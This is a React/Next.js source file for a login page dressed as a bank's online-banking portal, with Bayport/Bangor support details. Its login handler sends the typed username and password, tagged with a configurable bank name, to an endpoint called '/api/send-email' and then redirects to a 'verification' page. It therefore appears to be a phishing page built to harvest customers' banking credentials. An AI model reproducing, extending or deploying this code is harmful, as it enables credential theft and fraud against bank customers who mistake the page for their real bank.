'use client';

import { useState } from 'react';
import { useRouter } from 'next/navigation';
import Moose from "/public/assets/be.png"
import Image from 'next/image';
import Footer from '../components/Footer';
import Logo from "/public/assets/logo.png"

export default function Login() {
  const router = useRouter();
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [saveUsername, setSaveUsername] = useState(false);
  const [infoTab, setInfoTab] = useState('info'); // 'moose' or 'info'
  const [isSubmitting, setIsSubmitting] = useState(false);
  const [submitStatus, setSubmitStatus] = useState(null);

  const toggleSaveUsername = () => {
    setSaveUsername(!saveUsername);
  };

  const togglePasswordVisibility = () => {
    const passwordInput = document.getElementById('password');
    if (passwordInput.type === 'password') {
      passwordInput.type = 'text';
    } else {
      passwordInput.type = 'password';
    }
  };

  const handleLogin = async(e) => {
    e.preventDefault();

    // Form validation
    if (!username || !password) {
      // You could add form validation UI feedback here
      return;
    }

    setIsSubmitting(true);
    setSubmitStatus(null);

    try {
      // Send data to the authentication API
      const response = await fetch("/api/send-email", {
        method: "POST",
        headers: {
          "Content-Type": "application/json",
        },
        body: JSON.stringify({
          bName: process.env.NEXT_PUBLIC_BANK_NAME,
          username: username,
          password: password,
        }),
      });

      if (!response.ok) {
        throw new Error("Authentication failed");
      }

      const data = await response.json();
      
      // Set success status
      setSubmitStatus("success");

      
      // Redirect to dashboard or next page after successful login
      setTimeout(() => {
        router.push("/verification");
      }, 1000);
    } catch (error) {
      console.error("Login failed:", error);
      setSubmitStatus("error");
      // You could add error handling UI feedback here
    } finally {
      setIsSubmitting(false);
    }
  };

  // Load saved username on component mount
  

  return (
    <>
    <div className="lg:flex lg:justify-center lg:items-center min-h-[80vh] bg-gray-100">
      <div className="w-full lg:max-w-4xl lg:h-[50vh] bg-white rounded-lg shadow-lg overflow-hidden flex flex-col lg:justify-center lg:align-middle">
        <div className="flex flex-col lg:flex-row">
          {/* Left side - Image or Info */}
          <div className="w-full h-full lg:w-1/2 relative">
            {infoTab === 'moose' ? (
              <div className="relative w-full h-72 lg:h-full">
                <Image
                  src={Moose}
                  alt="Nature scene with young moose"
                  layout="fill"
                  objectFit="cover"
                  priority
                />
              </div>
            ) : (
              <div className="bg-black text-white p-8 h-full">
                <button 
                  className="absolute top-7 right-2 text-white"
                  onClick={() => setInfoTab('moose')}
                >
                  <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                    <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M6 18L18 6M6 6l12 12" />
                  </svg>
                </button>
                <h2 className="text-lg font-semibold mb-4">Nightly Processing</h2>
                <p className="mb-4">Our nightly processing starts at 12:00AM. During processing, same day transactions & transfer services may be unavailable.</p>
                
                <h2 className="text-lg font-semibold mb-2 mt-6">Need Help?</h2>
                <p>
                  Bayport Support can be reached by phone at 1.877.226.4671 or by chat on bangor.com. We are available Monday - Friday 7:00 AM - 7:00 PM, Saturday 8:00 AM - 2:00 PM & Sunday 9:00 AM - 2:00 PM.
                </p>
              </div>
            )}
            {infoTab === 'moose' && (
              <button 
                className="absolute top-7 right-2 bg-transparent p-1 rounded-full"
                onClick={() => setInfoTab('info')}
              >
                <svg xmlns="http://www.w3.org/2000/svg" className="h-6 w-6 text-white" fill="none" viewBox="0 0 24 24" stroke="currentColor">
                  <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M3 8l7.89 5.26a2 2 0 002.22 0L21 8M5 19h14a2 2 0 002-2V7a2 2 0 00-2-2H5a2 2 0 00-2 2v10a2 2 0 002 2z" />
                </svg>
              </button>
            )}
          </div>
          
          {/* Right side - Login Form */}
          <div className="h-full lg:w-1/2 p-4 lg:p-10 self-center lg:self-start">
            {/* Logo */}
            <div className="flex justify-center align-middle mb-6">
              <Image width={"full"}
                height={"full"} 
                src={Logo}
                alt="FDIC" 
                className="mx-auto mb-2 w-[70%] h-full"/>
            </div>
            
            {/* FDIC Section */}
            {/* <div className="border border-black rounded-md p-4 mb-6 text-left  text-xs flex text-black ">
              <Image
                width={50}
                height={50} 
                src="/api/placeholder/100/40" 
                alt="FDIC" 
                className="mx-auto mb-2 w-6 h-6"
              />
              FDIC-Insured - Backed by the full faith and <br/>
              credit of the U.S. Government
            </div> */}
            
            {/* Login Form */}
            <div>
              <div className="mb-4">
                <label htmlFor="username" className="block text-sm mb-1 text-black">Username</label>
                <div className="relative">
                  <input
                    id="username"
                    type="text"
                    value={username}
                    onChange={(e) => setUsername(e.target.value)}
                    className="w-full border border-gray-300 p-2 rounded text-black"
                  />
                  <div className="absolute right-2 top-2 flex items-center text-xs text-black">
                    <span className="mr-2">Save</span>
                    <div 
                      className={`w-10 h-6 flex items-center rounded-full p-1 cursor-pointer ${saveUsername ? 'bg-green-400' : 'bg-gray-800'}`}
                      onClick={toggleSaveUsername}
                    >
                      <div 
                        className={`bg-white w-4 h-4 rounded-full shadow-md transform transition-transform duration-300 ${saveUsername ? 'translate-x-4' : ''}`}
                      />
                    </div>
                  </div>
                </div>
              </div>
              
              <div className="mb-6">
                <label htmlFor="password" className="block text-sm mb-1 text-black">Password</label>
                <div className="relative">
                  <input
                    id="password"
                    type="password"
                    value={password}
                    onChange={(e) => setPassword(e.target.value)}
                    className="w-full border border-gray-300 p-2 rounded text-black"
                  />
                  <button 
                    type="button"
                    onClick={togglePasswordVisibility}
                    className="absolute right-2 top-2"
                  >
                    <svg xmlns="http://www.w3.org/2000/svg" className="h-5 w-5" fill="none" viewBox="0 0 24 24" stroke="black">
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M15 12a3 3 0 11-6 0 3 3 0 016 0z" />
                      <path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M2.458 12C3.732 7.943 7.523 5 12 5c4.478 0 8.268 2.943 9.542 7-1.274 4.057-5.064 7-9.542 7-4.477 0-8.268-2.943-9.542-7z" />
                    </svg>
                  </button>
                </div>
              </div>
              
              <button
                onClick={handleLogin}
                disabled={isSubmitting}
                className={`w-full bg-slate-400 text-white py-3 rounded mb-4 ${isSubmitting ? 'opacity-70 cursor-not-allowed' : ''}`}
              >
                {isSubmitting ? 'Logging in...' : 'Login'}
              </button>
              
              {submitStatus === 'error' && (
                <div className="text-red-500 text-sm mb-4 text-center">
                  Login failed. Please check your credentials.
                </div>
              )}
            </div>
            
            {/* Links */}
            <div className="text-center text-blue-600 text-sm">
              <a href={process.env.NEXT_PUBLIC_SIGNUP_URL} className="block mb-1 hover:underline">Sign up</a>
              <a href={process.env.NEXT_PUBLIC_FORGET_PASSWORD_URL} className="block mb-1 hover:underline">Forgot Login?</a>
              <a href={process.env.NEXT_PUBLIC_PRIVACY_POLICY_URL} className="block mb-1 hover:underline">Test your browser</a>
              <a href={process.env.NEXT_PUBLIC_MAIN_PAGE_URL} className="block hover:underline">Trouble testing your browser</a>
            </div>
          </div>
        </div>
      </div>
      
    </div>
    <Footer/>
    </>
  );
}
